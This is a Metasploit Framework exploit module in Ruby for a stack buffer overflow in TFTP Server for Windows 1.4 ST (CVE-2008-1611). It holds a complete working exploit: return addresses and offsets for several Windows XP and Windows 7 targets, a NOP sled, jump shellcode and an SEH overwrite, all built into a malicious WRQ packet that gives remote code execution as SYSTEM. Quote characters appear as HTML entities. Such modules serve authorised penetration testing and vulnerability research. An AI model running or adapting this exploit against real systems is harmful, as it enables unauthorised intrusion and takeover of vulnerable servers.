# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote

  Rank = NormalRanking
  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;TFTP Server for Windows 1.4 ST WRQ Buffer Overflow&#039;,
      &#039;Description&#039;     => %q{
          This module exploits a vulnerability found in TFTP Server 1.4 ST.  The flaw
        is due to the way TFTP handles the filename parameter extracted from a WRQ request.
        The server will append the user-supplied filename to TFTP server binary&#039;s path
        without any bounds checking, and then attempt to open this with a fopen(). Since
        this isn&#039;t a valid file path, fopen() returns null, which allows the corrupted
        data to be used in a strcmp() function, causing an access violation.

        Since the offset is sensitive to how the TFTP server is launched, you must know
        in advance if your victim machine launched the TFTP as a &#039;Service&#039; or &#039;Standalone&#039;
        , and then manually select your target accordingly. A successful attempt will lead
        to remote code execution under the context of SYSTEM if run as a service, or
        the user if run as a standalone. A failed attempt will result a denial-of-service.
      },
      &#039;Author&#039;          =>
        [
          &#039;Mati Aharoni&#039;, #Initial discovery, PoC
          &#039;Datacut&#039;       #Metasploit
        ],
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2008-1611&#039; ],
          [ &#039;OSVDB&#039;, &#039;43785&#039; ],
          [ &#039;BID&#039;, &#039;18345&#039; ],
          [ &#039;EDB&#039;, &#039;5314&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; =>&#039;seh&#039;,
        },
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;           => 600,
          &#039;BadChars&#039;        => "\x00\x2f",
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Targets&#039;         =>
        [
          # datacut tested ok 19/04/12 on xp sp2 sp3, win 7 sp0 sp1.
          # possible may work for other service packs and or vista
          # Rets = P/P/R from tftpserversp.exe
          [ &#039;Windows XP SP2/SP3 EN Service Mode&#039;,       { &#039;Ret&#039; => 0x416801 , &#039;Offset&#039; => 1203} ],
          [ &#039;Windows XP SP2/SP3 EN Standalone Mode&#039;,    { &#039;Ret&#039; => 0x416801 , &#039;Offset&#039; => 1487} ],
          [ &#039;Windows 7 SP0/SP1 EN x64 Service Mode&#039;,    { &#039;Ret&#039; => 0x416801 , &#039;Offset&#039; => 1217} ],
          [ &#039;Windows 7 SP0/SP1 EN x64 Standalone Mode&#039;, { &#039;Ret&#039; => 0x416801 , &#039;Offset&#039; => 1501} ],
          [ &#039;Windows 7 SP0/SP1 EN x86 Service Mode&#039;,    { &#039;Ret&#039; => 0x416801 , &#039;Offset&#039; => 1223} ],
          [ &#039;Windows 7 SP0/SP1 EN x86 Standalone Mode&#039;, { &#039;Ret&#039; => 0x416801 , &#039;Offset&#039; => 1507} ]
        ],
      &#039;Privileged&#039;  => false,
      &#039;DisclosureDate&#039;=> &#039;Mar 26 2008&#039;,
      &#039;DefaultTarget&#039; => 4))  #TFTP is installed as a service

    register_options(
      [
        Opt::RPORT(69)
      ], self.class)
  end


  def exploit
    connect_udp

    nops = make_nops(50)
    lead = rand_text_alphanumeric(target[&#039;Offset&#039;] - payload.encoded.length - nops.length)
    near = "\xe9\x80\xfd\xff\xff"    #jump back 640 bytes to the nop sled
    nseh = "\xeb\xf9" + make_nops(2) #jump back 7 bytes to the long jump

    evil = lead + nops + payload.encoded + near + nseh + [target.ret].pack(&#039;V&#039;)
    mode = "netascii"

    #Send the WRQ packet (header "\x00\x02")
    sploit = "\x00\x02" + evil + "\0" + mode +"\0"

    udp_sock.put(sploit)

    handler
    disconnect_udp
  end

end



